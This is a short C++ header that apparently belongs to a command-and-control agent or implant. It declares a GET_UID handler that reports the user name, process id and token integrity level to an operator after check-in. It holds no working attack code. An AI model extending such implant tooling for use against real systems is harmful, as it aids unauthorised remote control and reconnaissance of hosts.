// ========================================== { START OF FILE } ========================================== //
#pragma once

#include "agent/commands/command_result.h"
#include "agent/models/checkin_models.h"

namespace agent::commands::exec {

    /// Reports the identity the agent is running as (GET_UID): user name, process id and the current
    /// token's integrity level. The reference's Agent::GetUID returned the user name alone; the pid and
    /// integrity level are the two facts an operator needs next, and both are already collected for the
    /// check-in, so they are reported together instead of forcing a second task.
    CommandResult GetUserIdentity(const models::CheckinResponse& task);

}  // namespace agent::commands::exec
// ========================================== { END OF FILE } ========================================== //
